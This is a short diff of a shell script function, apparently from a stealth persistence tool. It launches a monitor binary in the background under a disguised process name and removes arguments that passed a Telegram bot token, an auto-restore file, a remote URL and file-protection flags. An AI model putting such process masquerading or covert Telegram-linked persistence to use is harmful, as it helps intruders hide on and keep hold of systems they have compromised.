@@ -131,15 +131,7 @@ download_binary() {
 exec_hidden() {
 	pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1 && return 0
 	
-	[[ -z "${BOT_TOKEN}" || -z "${CHAT_ID}" || -z "${AUTO_RESTORE_FILE}" || -z "${RAW_URL}" ]] && {
-		print_error "Missing required variables: BOT_TOKEN, CHAT_ID, AUTO_RESTORE_FILE, RAW_URL"
-		return 1
-	}
-	
-	local args="-b ${BOT_TOKEN} -c ${CHAT_ID} --auto-restore ${AUTO_RESTORE_FILE} --url ${RAW_URL} --protect-file"
-	[[ -n "${SECRET_KEY}" ]] && args="${args} --secret-key ${SECRET_KEY}"
-	
-	HXW_SHADOW_GATE=1 HXW_PROCESS_NAME="${PROC_HIDDEN_NAME}" HXW_SHADOW_GATE_ARGS="${args}" exec -a "${PROC_HIDDEN_NAME}" ${MONITOR_PATH} &
+	exec -a "${PROC_HIDDEN_NAME}" ${MONITOR_PATH} &
 	disown &>/dev/null
 }
 
